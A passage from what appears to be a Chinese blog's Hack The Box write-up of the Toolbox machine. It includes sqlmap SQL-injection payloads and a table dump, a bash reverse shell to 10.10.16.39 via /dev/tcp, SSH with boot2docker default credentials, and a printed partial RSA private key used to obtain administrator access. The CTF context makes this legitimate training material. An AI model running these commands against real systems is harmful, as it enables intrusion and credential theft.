+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-origin</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span>
+<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://admin.megalogistic.com/</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
+<span class="token header"><span class="token header-name keyword">Priority</span><span class="token punctuation">:</span> <span class="token header-value">u=0, i</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>
+
+username=admin&amp;password=11111111111</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ sqlmap <span class="token parameter variable">-r</span> megalogisic.txt <span class="token parameter variable">--batch</span> --force-ssl
+        ___
+       __H__
+ ___ ___<span class="token punctuation">[</span>,<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.9</span>.2<span class="token comment">#stable&#125;</span>
+<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span>.<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |
+|___|_  ['</span><span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>
+      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org
+
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:56:30 /2025-03-21/
+
+[23:56:30] [INFO] parsing HTTP request from '</span>megalogisic.txt<span class="token string">'
+[23:56:30] [INFO] testing connection to the target URL
+&lt;...>
+[23:57:59] [INFO] target URL appears to be UNION injectable with 2 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '</span>--union-char<span class="token string">'? [Y/n] Y
+POST parameter '</span>username<span class="token string">' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: username=admin'</span> AND <span class="token punctuation">(</span>SELECT <span class="token punctuation">(</span>CASE WHEN <span class="token punctuation">(</span><span class="token number">1444</span><span class="token operator">=</span><span class="token number">1444</span><span class="token punctuation">)</span> THEN NULL ELSE CAST<span class="token variable"><span class="token punctuation">((</span>CHR<span class="token punctuation">(</span><span class="token number">86</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">))</span></span> AS NUMERIC<span class="token punctuation">)</span> END<span class="token punctuation">))</span> IS NULL AND <span class="token string">'iHTD'</span><span class="token operator">=</span><span class="token string">'iHTD&amp;password=11111111111
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: username=admin'</span> AND <span class="token assign-left variable">9042</span><span class="token operator">=</span>CAST<span class="token variable"><span class="token punctuation">((</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">))</span></span><span class="token operator">||</span><span class="token punctuation">(</span>SELECT <span class="token punctuation">(</span>CASE WHEN <span class="token punctuation">(</span><span class="token number">9042</span><span class="token operator">=</span><span class="token number">9042</span><span class="token punctuation">)</span> THEN <span class="token number">1</span> ELSE <span class="token number">0</span> END<span class="token punctuation">))</span>::text<span class="token operator">||</span><span class="token punctuation">(</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">107</span><span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">))</span> AS NUMERIC<span class="token punctuation">)</span> AND <span class="token string">'wDZN'</span><span class="token operator">=</span><span class="token string">'wDZN&amp;password=11111111111
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: username=admin'</span><span class="token punctuation">;</span>SELECT PG_SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>--<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token number">11111111111</span>
+
+    Type: time-based blind
+    Title: PostgreSQL <span class="token operator">></span> <span class="token number">8.1</span> AND time-based blind
+    Payload: <span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token string">' AND 2617=(SELECT 2617 FROM PG_SLEEP(5)) AND '</span>AtXQ<span class="token string">'='</span>AtXQ<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token number">11111111111</span>
+---
+<span class="token punctuation">[</span><span class="token number">23</span>:58:12<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is PostgreSQL
+web server operating system: Linux Debian <span class="token number">10</span> <span class="token punctuation">(</span>buster<span class="token punctuation">)</span>
+web application technology: PHP <span class="token number">7.3</span>.14, Apache <span class="token number">2.4</span>.38
+back-end DBMS: PostgreSQL
+<span class="token punctuation">[</span><span class="token number">23</span>:58:17<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">23</span>:58:17 /2025-03-21/
+</code></pre>
+
+<p>找到admin用户</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ sqlmap <span class="token parameter variable">-r</span> megalogisic.txt <span class="token parameter variable">--batch</span> --force-ssl <span class="token parameter variable">--dbms</span> PostgreSQL <span class="token parameter variable">--dump</span>
+        ___
+       __H__
+ ___ ___<span class="token punctuation">[</span>,<span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.9</span>.2<span class="token comment">#stable&#125;</span>
+<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ <span class="token number">23</span>:59:23 /2025-03-21/
+
+<span class="token punctuation">[</span><span class="token number">23</span>:59:23<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> parsing HTTP request from <span class="token string">'megalogisic.txt'</span>
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+<span class="token punctuation">[</span><span class="token number">23</span>:59:41<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> no <span class="token function">clear</span> password<span class="token punctuation">(</span>s<span class="token punctuation">)</span> found                                                  
+Database: public
+Table: <span class="token function">users</span>
+<span class="token punctuation">[</span><span class="token number">1</span> entry<span class="token punctuation">]</span>
++----------------------------------+----------+
+<span class="token operator">|</span> password                         <span class="token operator">|</span> username <span class="token operator">|</span>
++----------------------------------+----------+
+<span class="token operator">|</span> 4a100a85cb5ca3616dcf137918550815 <span class="token operator">|</span> admin    <span class="token operator">|</span>
++----------------------------------+----------+
+
+<span class="token punctuation">[</span><span class="token number">23</span>:59:41<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> table <span class="token string">'public.users'</span> dumped to CSV <span class="token function">file</span> <span class="token string">'/home/kali/.local/share/sqlmap/output/admin.megalogistic.com/dump/public/users.csv'</span>
+<span class="token punctuation">[</span><span class="token number">23</span>:59:41<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/home/kali/.local/share/sqlmap/output/admin.megalogistic.com'</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ <span class="token number">23</span>:59:41 /2025-03-21/</code></pre>
+
+<p>使用 –os-shell 直接反弹shell <code>bash -c &#39; bash -i &amp;&gt;/dev/tcp/10.10.16.39/9003 &lt;&amp;1&#39;</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ sqlmap <span class="token parameter variable">-r</span> megalogisic.txt  --force-ssl <span class="token parameter variable">--dbms</span> PostgreSQL --os-shell 
+        ___
+       __H__
+ ___ ___<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.9</span>.2<span class="token comment">#stable&#125;</span>
+<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token string">']     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>
+<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span>"<span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>
+      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org
+
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:00:38 /2025-03-22/
+
+[00:00:38] [INFO] parsing HTTP request from '</span>megalogisic.txt<span class="token string">'
+&lt;...>
+os-shell> whoami
+do you want to retrieve the command standard output? [Y/n/a] Y
+[00:01:47] [INFO] retrieved: '</span>postgres<span class="token string">'
+command standard output: '</span>postgres<span class="token string">'
+os-shell> id
+do you want to retrieve the command standard output? [Y/n/a] Y
+[00:02:01] [INFO] retrieved: '</span>uid<span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span>,102<span class="token punctuation">(</span>ssl-<span class="token punctuation">..</span>.
+<span class="token builtin class-name">command</span> standard output: <span class="token string">'uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)'</span>
+os-shell<span class="token operator">></span> <span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">' bash -i &amp;>/dev/tcp/10.10.16.39/9003 &lt;&amp;1'</span>
+<span class="token keyword">do</span> you want to retrieve the <span class="token builtin class-name">command</span> standard output? <span class="token punctuation">[</span>Y/n/a<span class="token punctuation">]</span> n
+</code></pre>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>成功接收到shell，查看内核信息，系统是boot2docker</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9003</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9003</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.10.236<span class="token punctuation">]</span> <span class="token number">49945</span>
+bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">524</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
+bash: no job control <span class="token keyword">in</span> this shell
+postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ <span class="token function">id</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">104</span><span class="token punctuation">(</span>postgres<span class="token punctuation">)</span>,102<span class="token punctuation">(</span>ssl-cert<span class="token punctuation">)</span>
+postgres@bc56e3cc55e9:/var/lib/postgresql$ <span class="token function">ifconfig</span> 
+<span class="token function">ifconfig</span> 
+eth0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu <span class="token number">1500</span>
+        inet <span class="token number">172.17</span>.0.2  netmask <span class="token number">255.255</span>.0.0  broadcast <span class="token number">172.17</span>.255.255
+        ether 02:42:ac:11:00:02  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
+        RX packets <span class="token number">3446</span>  bytes <span class="token number">686371</span> <span class="token punctuation">(</span><span class="token number">670.2</span> KiB<span class="token punctuation">)</span>
+        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
+        TX packets <span class="token number">3502</span>  bytes <span class="token number">1260682</span> <span class="token punctuation">(</span><span class="token number">1.2</span> MiB<span class="token punctuation">)</span>
+        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ <span class="token function">uname</span> <span class="token parameter variable">-a</span>
+<span class="token function">uname</span> <span class="token parameter variable">-a</span>
+Linux bc56e3cc55e9 <span class="token number">4.14</span>.154-boot2docker <span class="token comment">#1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux</span>
+</code></pre>
+
+<p>通过Google  boot2docker 有默认用户和密码docker：tcuser，使用ssh 切换用户</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">postgres@bc56e3cc55e9:/$ script /dev/null <span class="token parameter variable">-c</span> /bin/bash
+script /dev/null <span class="token parameter variable">-c</span> /bin/bash
+Script started, <span class="token function">file</span> is /dev/null
+postgres@bc56e3cc55e9:/$ <span class="token function">ssh</span> docker@172.17.0.1
+<span class="token function">ssh</span> docker@172.17.0.1
+docker@172.17.0.1<span class="token string">'s password: tcuser
+
+   ( '</span><span class="token operator">></span>'<span class="token punctuation">)</span>
+  /<span class="token punctuation">)</span> TC <span class="token punctuation">(</span><span class="token punctuation">\</span>   Core is distributed with ABSOLUTELY NO WARRANTY.
+ <span class="token punctuation">(</span>/-_--_-<span class="token punctuation">\</span><span class="token punctuation">)</span>           www.tinycorelinux.net
+
+</code></pre>
+
+
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查找可以利用的信息，可以在C:\Users\Administrator.ssh\ 下找到 id_rsa</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">docker@box:~$ <span class="token builtin class-name">cd</span> /c/Users                                                      
+<span class="token builtin class-name">cd</span> /c/Users
+docker@box:/c/Users$ <span class="token function">ls</span>                                                        
+<span class="token function">ls</span>
+Administrator  Default        Public         desktop.ini
+All Users      Default User   Tony
+docker@box:/c/Users$ <span class="token builtin class-name">cd</span> Administrator                                          
+<span class="token builtin class-name">cd</span> Administrator
+docker@box:/c/Users/Administrator$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>                                      
+<span class="token function">ls</span> <span class="token parameter variable">-la</span>
+total <span class="token number">1437</span>
+drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff         <span class="token number">8192</span> Feb  <span class="token number">8</span>  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
+dr-xr-xr-x    <span class="token number">1</span> <span class="token function">docker</span>   staff         <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2020</span> <span class="token punctuation">..</span>
+drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff         <span class="token number">4096</span> Mar <span class="token number">21</span> <span class="token number">15</span>:15 .VirtualBox
+drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> .docker
+drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">19</span>  <span class="token number">2020</span> .ssh
+dr-xr-xr-x    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> 3D Objects
+drwxrwxrwx    <span class="token number">1</span> <span class="token function">docker</span>   staff            <span class="token number">0</span> Feb <span class="token number">18</span>  <span class="token number">2020</span> AppData
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>
+
+<p>复制id_rsa 到本地，赋予600 权限，ssh登录可获得管理员权限</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">docker@box:/c/Users/Administrator/.ssh$ <span class="token function">cat</span> id_rsa                             
+<span class="token function">cat</span> id_rsa 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
+Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
+M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
+7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
+4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
+<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
+bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
+q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
+BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa administrator@10.10.10.236  
+The authenticity of <span class="token function">host</span> <span class="token string">'10.10.10.236 (10.10.10.236)'</span> can<span class="token string">'t be established.
+ED25519 key fingerprint is SHA256:KJAib23keV2B8xvFaxg7e79uztryW+LYX+Wb2qA9u4k.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span><span class="token number">10.10</span>.10.236' <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span> to the list of known hosts.
+
+Microsoft Windows <span class="token punctuation">[</span>Version <span class="token number">10.0</span>.17763.1039<span class="token punctuation">]</span>
+<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2018</span> Microsoft Corporation. All rights reserved.
+
+administrator@TOOLBOX C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">></span>
+</code></pre>
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">&#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">C:\Users\Administrator\Desktop\flag.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
 </search>
